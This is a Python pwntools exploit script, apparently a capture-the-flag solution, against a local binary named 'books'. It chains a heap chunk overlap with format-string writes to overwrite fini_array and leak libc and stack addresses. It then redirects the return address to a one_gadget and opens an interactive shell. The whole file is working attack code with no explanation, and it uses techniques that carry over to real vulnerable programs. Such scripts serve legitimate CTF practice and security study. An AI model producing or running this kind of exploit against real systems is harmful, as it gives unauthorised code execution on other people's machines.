#coding:utf-8
from pwn import *


context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process("./books")
p = ELF("./books")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


def edit(index,content):
    io.recvuntil("Submit\n")
    io.sendline(str(index))
    io.recvuntil("order:\n")
    io.sendline(content)
    
def delete(index):
    io.recvuntil("Submit\n")
    io.sendline(str(index+2))
    
def submit(content):
    io.recvuntil("Submit\n")
    io.sendline("5"+content)
    
fini_array = 0x6011B8

payload = '%'+str(0xa39)+'c%13$hn;%31$p,%28$p,'
payload = payload.ljust(0x74,'a')
payload = payload.ljust(0x88,"\x00")
payload += p64(0x151)
payload += 'b' * 0x140
payload += p64(0) + p64(0x21)
payload += p64(0)*3 + p64(0x21)

edit(1,payload)
#gdb.attach(io,"b *0x40091C")
#raw_input("en: ")
delete(2)
gdb.attach(io,"b *0x400CAC")
raw_input("en: ")
submit("aaaaaaa"+p64(fini_array))


io.recvuntil(';')
io.recvuntil(';')
io.recvuntil(';')
libc_main = int(io.recvuntil(',')[:-1],16) - 240
stack_addr = int(io.recvuntil(',')[:-1],16)
#log.success("libc_main: "+hex(libc_main))
libc_base = libc_main - libc.symbols["__libc_start_main"]
#log.success("libc_base: "+hex(libc_base))
ret_addr = stack_addr - 0xd8 - 0x110
log.success("ret_addr: "+hex(ret_addr))
one_gadget = libc_base + 0x45216 #0x4526a 0xf02a4 0xf1147

one_shot1 ='0x' + str(hex(one_gadget))[-2:]
one_shot2 ='0x' + str(hex(one_gadget))[-6:-2]
one_shot1 = int(one_shot1,16)
one_shot2 = int(one_shot2,16)

payload = '%'+str(one_shot1)+'d%13$hhn%'+str(one_shot2-one_shot1)+'d%14$hn'
payload = payload.ljust(0x74,'a')
payload = payload.ljust(0x88,"\x00")
payload += p64(0x151)
payload += 'b' * 0x140
payload += p64(0) + p64(0x21)
payload += p64(0)*3 + p64(0x21)
edit(1,payload)
#gdb.attach(io,"b *0x40091C")
#raw_input()
delete(2)

submit('aaaaaaa'+p64(ret_addr)+p64(ret_addr+1))
io.interactive()
